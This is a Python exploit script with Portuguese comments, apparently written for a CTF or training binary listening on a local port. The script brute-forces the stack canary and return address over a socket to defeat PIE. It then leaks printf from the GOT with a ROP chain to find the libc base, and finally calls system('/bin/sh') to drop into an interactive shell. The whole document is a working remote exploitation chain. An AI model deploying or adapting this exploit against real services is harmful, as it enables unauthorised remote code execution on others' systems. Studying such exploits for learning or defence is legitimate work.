#!/usr/bin/python3

import struct
import socket
from telnetlib import Telnet

# definindo o alvo
#target = ("192.168.0.113", 1337)
target = ("127.0.0.1", 1337)

# funcoes auxiliares
p64 = lambda x: struct.pack("Q", x)
u64 = lambda x: struct.unpack("Q", x)

# funcao de bruteforce
def bruteforce(payload):
    for i in range(256):
        next_byte = 0x01 * i
        next_byte = bytes([next_byte])

        tmp_payload = payload + next_byte

        p.send(tmp_payload)
        p.recv(1024)
        output = p.recv(1024)
        if b"Valeu!" in output:
            print(f"[+] Byte encontrado: {hex(i)}")
            return next_byte
        if i == 255:
            print("[-] Erro ao encontrar o pr√≥ximo byte!")
            exit()


# offset
offset = b"A" * 40
rbp = b"B" * 8

# conectando ao alvo
p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect(target)

p.recv(1024)

################### BYPASS CANARY

# bruteforce Canary
print("[+] Procurando o valor do Canary...")
canary = b""
for i in range(8):
    canary = canary + bruteforce(offset + canary)
print(f"[+] Valor do Canary: {canary.hex()}")


# criando o payload
payload = offset + canary + rbp


################### BYPASS PIE


# bruteforce valor de retorno
print("[+] Procurando valor de retorno...")
ret = b""
for i in range(6):
    ret = ret + bruteforce(payload + ret)
ret += b"\x00\x00"
ret = ret.ljust(8, b"\x00")
ret = u64(ret)[0]
print(f"[+] Valor de retorno: {hex(ret)}")

# offset do endereco de retorno
offset_ret = 0x1250
# calculando endereco base
elf_base = ret - offset_ret
print(f"[+] ELF BASE @ {hex(elf_base)}")


################## BYPASS ASLR
# instrucao assembly pop rdi; ret
pop_rdi = 0x12eb + elf_base

# offsets da printf
printf_got = 0x4028 + elf_base
printf_plt = 0x1050 + elf_base
main = 0x122e + elf_base

payload_aslr = payload
payload_aslr += p64(pop_rdi)
payload_aslr += p64(printf_got)
payload_aslr += p64(printf_plt)
payload_aslr += p64(main)

# enciando o payload
p.send(payload_aslr)

# recebendo a primeira linha
p.recv(1024)

# recebendo a segunda linha
p.recv(1024)

#recebendo a terceira linha
elf_printf = p.recv(1024)
elf_printf = elf_printf.replace(b"Preencha meu buffer:", b"").strip()
elf_printf = u64(elf_printf.ljust(8, b"\x00"))[0]
print(f"[+] ELF PRINTF @ {hex(elf_printf)}")

# offset printf GLIBC
offset_printf = 0x579e0
libc_base = elf_printf - offset_printf
print(f"[+] LIBC BASE @ {hex(libc_base)}")


################ BYTE NX

# offsets
system = 0x49860 + libc_base
binsh = 0x198882 + libc_base

payload_nx = payload
payload_nx += p64(pop_rdi)
payload_nx += p64(binsh)
payload_nx += p64(system)
payload_nx += p64(main)

p.send(payload_nx)

# shell
t = Telnet()
t.sock = p
t.interact()





